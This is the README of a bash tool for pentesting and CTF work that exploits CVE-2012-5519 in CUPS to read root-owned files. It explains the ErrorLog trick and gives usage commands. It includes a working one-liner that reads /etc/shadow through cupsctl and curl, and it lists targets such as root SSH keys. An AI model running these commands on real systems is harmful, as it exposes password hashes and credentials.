# cups-root-file-read.sh ⭐
a bash implementation of the metasploit 'cups\_root\_file_read.rb' module designed for pentesting and CTFs.  
mainly a short exercise in bash scripting. intended to be a self-contained program that exploits CVE-2012-5519 on linux systems;  
it provides the user with an interactive prompt, allowing them to quickly read multiple restricted files.

## the exploit - CVE-2012-5519 ❗
this script exploits a vulnerability in CUPS (common UNIX printing system) < 1.6.2.  
CUPS allows users within the lpadmin group to make changes to the cupsd.conf file, with the `cupsctl` command.  
this command also allows the user to specify an ErrorLog path.  
when the user visits the '/admin/log/error_log page', the cupsd daemon running with an SUID of root reads the ErrorLog path and echoes it in plain text.  
in short, files owned by the root user can be read if the ErrorLog path is directed there.

## prerequisites ✔
the script makes a number of checks before passing the prompt to the user; however all prerequisites include:  
- linux - the script has only been tested on linux and may not work on other operating systems.
- bash - cups-root-file-read.sh is written in bash.
- curl - (checked within script) used for requesting the webpage. there are currently no alternative http parsing commands built into the script such as `wget` or `nc` due to time limitations.
- vulnerable - (checked within script) there are a few checks made to make sure the vulnerability exists and whether the current user can exploit it, and therefore use the exploit script. these include being a member of the 'lpadmin' group, if the `cupsctl` command is available, etc...

## usage ℹ
it is assumed that the script will be used for the purposed of pentesting and CTF events. place the script on the target machine. this can be done in various ways. one common method from the target machine:
```
wget http://[my ip]:[my port]/cups-root-file-read.sh
```
cups-root-file-read.sh does not require any arguments or flags but has two optional ones:
```
./cups-root-file-read.sh -h

./cups-root-file-read.sh does not require any arguments to run.
it is currently interactive only.
usage: ./cups-root-file-read.sh [-a|--accessible] [-h|--help]
        -a, --accessible: turns off features which may negatively affect
        screen readers.
        -h, --help: prints this dialog message.
after passing all the required checks for the exploit,
the user will be prompted for input.
type in the full path to a file to read it.
eg.
        1. /root/.ssh/id_rsa
        2. /root/.bash_history
        3. /etc/shadow etc...
```
run with:
```
bash cups-root-file-read.sh
```
or
```
chmod +x cups-root-file-read.sh

./cups-root-file-read.sh
```

or if you want to read a single file only:

```
echo '/etc/shadow' | ./cups-root-file-read.sh
```
after passing the initial functionality and vulnerability checks, the user is provided with a prompt allowing them to type in an absolute path to an existing file. the contents of each file will be printed to the terminal.

### best use:
while the script can be used to test for restricted files and read them, it is more useful if the user already knows the existence of restricted files they might want to view. for example:

* /root/.ssh/id_rsa
* /root/.bash_history
* /etc/shadow
* /etc/sudoers ... etc.

## limitations ⚠
there are a few limitations to the script and exploit. and as far as i'm aware, the 'cups\_root\_file_read.rb' module for metasploit also suffers from these same limitations.

### whitespace:
the submission by the user must be an **absolute path** to an **existing file** the user wants to view and must not contain whitespace anywhere in the file or path. this is because the `cupsctl` command cannot handle whitespace characters correctly even with quotations (eg. ErrorLog='/path to/file.txt') and will separate the input at the whitespace characters into separate directives, with the boolean value of 'true'.  
the previous example, if submitted, would be written to the cupsd.conf file as:
```
ErrorLog=/path
to/file.txt=true
```
this throws errors that get written to the error log which may be important files if specified in the ErrorLog path in a previous successful attempt to read a file. Therefore, the script checks for whitespace and filters it.
***

### returning 404 status codes:
despite checks to make sure the user submits something that resembles an absolute path and file, not all errors can be caught before being passed to the server with the `cupsctl` command:  
files existing within the root directory can be read (eg. '/file.txt') but common unix directories such as '/tmp' and '/root' can also be submitted (be it purposefully or through user error). there is no catch for such system directories and these will return 404 status codes from the server. the user gets informed of these.  
non-existent directories specified in the path (eg. '/tmp/non-existent-directory/file.txt') will also result in a 404 status code being returned by the server.
***

### empty files:
trying to view non-existent files (eg. '/root/non-existent-file.txt') will result in their creation as the new error log. the user is informed of this in the output and that the empty file may have been created by the exploit script if it was not already there beforehand. there is always the possibility that these empty files may have been created by a system user for whatever purpose at around the same time the script was run and so they are not cleaned up.

while linux has commands to test if a file or directory exists, this feature has not been implemented in the script before the user input is passed to the `cupsctl` command since test commands do not work if a file or directory exists in a place off limits to the current user (eg. '/root') for obvious security reasons. since the script is designed to read such off limit files, such a feature would be pointless.
***

### cups errors:
sometimes `cupsctl` errors may occur when making changes, either manually, or through cups-root-file-read.sh. while cups-root-file-read.sh handles unusual user input and some errors, these `cupsctl` errors that occur while making changes to the cupsd.conf file or while requesting the webpage are not handled. cups-root-file-read.sh will simply exit. in these cases, the script can be started again, and another attempt can be made.
***

## notes 📝
the script was mainly an exercise in creating a short, comprehensive, self-contained program for a single exploit with both readability and accessibility in mind.

the script is intended for testing the presence of CVE-2012-5519 and then quickly and easily reading **multiple** restricted files during exploitation. for that purpose i feel it's significantly quicker than both the metasploit module and typing in a manual command, and editing it repeatedly (i hope). but having said that, if the user knows the target machine is vulnerable, the same result can be achieved with something like:
```
cupsctl ErrorLog=/etc/shadow WebInterface=Yes && curl 'http://localhost:631/admin/log/error_log'
```

as of 2022, this exploit is 10 years old. if the target machine is also old, its possible that the versions of the various commands being utilised within the script do not have the functionality they now have. this might also apply to the version of bash as well. unfortunately i was limited by time and was not able to test the script in a wider range of environments. it may be more useful for CTFs.

originally the script was going to be created with python3 however i have come across a number of occasions where python2 and python3 were not available to the user after gaining access to a system as an unprivileged user. bash is nearly always available on a linux system as well as common linux commands so a bash implementation seemed the safer option.

bash built-in commands are used as much as possible however the script relies on some external commands such as `sort`, `head` and `curl` (and of course `cupsctl` used as part of the exploit). there are currently no checks for these commands and no alternative due to time constraints. the script will fail if these commands are not available :(

## credits 👍
https://argbash.io - for help with initial script arguments.  
https://skerritt.blog/a11y/ - accessibility implementation.
